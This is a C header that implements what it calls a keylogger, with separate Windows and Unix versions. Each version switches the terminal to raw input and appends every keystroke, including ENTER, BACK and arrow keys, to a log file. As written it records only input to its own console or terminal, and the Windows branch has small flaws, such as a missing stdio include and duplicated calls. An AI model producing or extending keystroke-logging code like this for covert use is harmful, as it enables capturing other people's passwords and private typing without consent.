#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#ifdef _WIN32
#include <windows.h>

typedef struct {
    HANDLE hKeyboard;
    FILE *log_file;
    int running;
    int is_virtual;
} KeyloggerState;

static int init_keylogger_win(KeyloggerState *state) {
    state->hKeyboard = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode;
    GetConsoleMode(state->hKeyboard, &mode);
    SetConsoleMode(state->hKeyboard, mode & ~(ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT));
    state->log_file = NULL;
    state->running = 1;
    state->is_virtual = 1;
    return 1;
}

static void start_keylog_win(KeyloggerState *state, const char *log_path) {
    state->log_file = fopen(log_path, "a");
    if(!state->log_file) return;
    
    fprintf(state->log_file, "\n=== Keylog Session Started ===\n");
    fflush(state->log_file);
    
    INPUT_RECORD irInBuf[128];
    DWORD fdwSaveOldMode;
    DWORD cNumRead;
    
    GetConsoleMode(state->hKeyboard, &fdwSaveOldMode);
    SetConsoleMode(state->hKeyboard, fdwSaveOldMode & ~(ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT));
    FlushConsoleInputBuffer(state->hKeyboard);
    
    while(state->running) {
        DWORD number_events;
        ReadConsoleInput(state->hKeyboard, irInBuf, 128, &cNumRead);
        
        for(DWORD i = 0; i < cNumRead; i++) {
            if(irInBuf[i].EventType == KEY_EVENT && irInBuf[i].Event.KeyEvent.bKeyDown) {
                WORD vk = irInBuf[i].Event.KeyEvent.wVirtualKeyCode;
                BYTE state_arr[256];
                GetKeyboardState(state_arr);
                
                WCHAR buff[16];
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                
                if(vk == VK_RETURN) {
                    fprintf(state->log_file, "[ENTER]\n");
                } else if(vk == VK_TAB) {
                    fprintf(state->log_file, "[TAB]");
                } else if(vk == VK_BACK) {
                    fprintf(state->log_file, "[BACK]");
                } else if(vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU) {
                    continue;
                } else {
                    UINT scan = MapVirtualKey(vk, 0);
                    ToUnicode(vk, scan, keyboard_state, buff, 16, 0);
                    if(buff[0]) {
                        fprintf(state->log_file, "%c", (char)buff[0]);
                    }
                }
                fflush(state->log_file);
            }
        }
    }
    
    if(state->log_file) fclose(state->log_file);
    SetConsoleMode(state->hKeyboard, fdwSaveOldMode);
}

#else
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <termios.h>
#include <sys/select.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>

typedef struct {
    FILE *log_file;
    int running;
    int fd;
    struct termios old_t;
} KeyloggerState;

static int init_keylogger_unix(KeyloggerState *state) {
    state->fd = open("/dev/tty", O_RDWR);
    if(state->fd < 0) state->fd = STDIN_FILENO;
    
    struct termios new_t;
    tcgetattr(state->fd, &state->old_t);
    new_t = state->old_t;
    new_t.c_lflag &= ~(ICANON | ECHO);
    new_t.c_cc[VMIN] = 0;
    new_t.c_cc[VTIME] = 0;
    tcsetattr(state->fd, TCSAFLUSH, &new_t);
    
    state->log_file = NULL;
    state->running = 1;
    return 1;
}

static void start_keylog_unix(KeyloggerState *state, const char *log_path) {
    state->log_file = fopen(log_path, "a");
    if(!state->log_file) return;
    
    fprintf(state->log_file, "\n=== Keylog Session Started ===\n");
    fflush(state->log_file);
    
    while(state->running) {
        fd_set readfds;
        struct timeval tv;
        char ch;
        
        FD_ZERO(&readfds);
        FD_SET(state->fd, &readfds);
        tv.tv_sec = 0;
        tv.tv_usec = 100000;
        
        if(select(state->fd + 1, &readfds, NULL, NULL, &tv) > 0) {
            int n = read(state->fd, &ch, 1);
            if(n > 0) {
                unsigned char c = (unsigned char)ch;
                
                if(c == 27) {
                    char seq[3];
                    if(read(state->fd, &seq[0], 1) > 0 && read(state->fd, &seq[1], 1) > 0) {
                        if(seq[0] == '[') {
                            if(seq[1] == 'A') fprintf(state->log_file, "[UP]");
                            else if(seq[1] == 'B') fprintf(state->log_file, "[DOWN]");
                            else if(seq[1] == 'C') fprintf(state->log_file, "[RIGHT]");
                            else if(seq[1] == 'D') fprintf(state->log_file, "[LEFT]");
                        }
                    }
                } else if(c == 127 || c == 8) {
                    fprintf(state->log_file, "[BACK]");
                } else if(c == '\n' || c == '\r') {
                    fprintf(state->log_file, "[ENTER]\n");
                } else if(c < 32) {
                    fprintf(state->log_file, "[0x%02X]", c);
                } else {
                    fprintf(state->log_file, "%c", c);
                }
                fflush(state->log_file);
            }
        }
    }
    
    if(state->log_file) {
        fprintf(state->log_file, "\n=== Keylog Session Ended ===\n");
        fclose(state->log_file);
    }
    tcsetattr(state->fd, TCSAFLUSH, &state->old_t);
    if(state->fd > 2) close(state->fd);
}

#endif

typedef KeyloggerState GlobalKeylogger;

#endif
